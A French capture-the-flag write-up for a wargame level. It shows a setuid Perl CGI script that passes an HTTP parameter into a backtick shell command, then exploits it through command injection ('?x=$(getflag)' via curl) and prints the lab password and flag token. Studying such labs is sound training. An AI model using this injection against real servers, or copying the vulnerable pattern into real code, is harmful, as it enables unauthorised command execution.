# Level04

Se connecter en tant que `level04`:

    $ ssh 192.168.1.124 -p 4242 -l level04
    level04@192.168.1.124's password: qi0maab88jeaj46qoumi7maus

---

> Methode 1

Lors de mes premières explorations de l'iso, j'avais pu voir que dans /var/www/ il y avait 2 dossiers concernant des levels précis dont le level04 mais je n'avais pas les droits pour savoir ce qu'ils contenaient.

    $ ls -la /var/www
    total 4
    [...]
    -r-xr-x---+ 1 root   root    177 Aug 30  2015 index.html
    dr-xr-x---+ 2 flag04 level04  60 Aug  3 08:50 level04
    [...]

Le home de level04 est une copie du dossier level04 dans /var/www, les deux contiennent un script perl.

    $ ls -la
    total 16
    [...]
    -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl

J'ai d'abord `cat` le fichier pour comprendre ce que le script perl faisait:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

`Le script perl utilise CGI qui est un framework pour exécuter des requêtes http`. Ici il prend des paramètres dans la requête comme on peut le voir avec `qw{param}`.

La fonction `x()` print le résultat de la commande `echo $y`. `$y` est ici le premier paramètre passé à la fonction x, qui est le paramètre x passé dans la requête http.

Je sais que je peux executer une commande dans un echo avec des `backquote`

    $ echo `ls -la`
    total 12 dr-xr-x---+ 1 level04 level04 100 Mar 5 2016 . d--x--x--x 1 root users 340 Aug 30 2015 .. -r-x------ 1 level04 level04 220 Apr 3 2012 .bash_logout -r-x------ 1 level04 level04 3518 Aug 30 2015 .bashrc -r-x------ 1 level04 level04 675 Apr 3 2012 .profile

Je sais aussi que le script perl est éxecuté avec les droits de l'utilisateur `flag04`

Il ne me reste plus qu'à exécuter le script via une requête `http`

    http://192.168.1.124:4747/?x=`getflag`

--------

> Methode 2

Premiere étape de recherche

    $ ls -l
    -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl

On trouve un script perl avec setuid et setgid

Version commentée du script

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
# fonction qui affiche son argument via echo
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
# l'argument de la fonction x est le parametre nomme "x"
x(param("x"));
```

Un script perl qui utilise CGI, donc servi par un serveur web, sur le port 4747 comme indiqué en commentaire

Testons avec curl

    $ curl -I 192.168.1.124:4747
    HTTP/1.1 200 OK
    Date: Thu, 28 Nov 2019 11:04:23 GMT
    Server: Apache/2.2.22 (Ubuntu)
    Vary: Accept-Encoding
    Content-Length: 1
    Content-Type: text/html

Le script affiche la valeur du parametre "x" de la requete

    $ curl 192.168.1.124:4747?x=getflag
    getflag

On peut injecter un subshell pour que echo affiche son resultat

    $ curl '192.168.1.124:4747?x=$(getflag)'
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
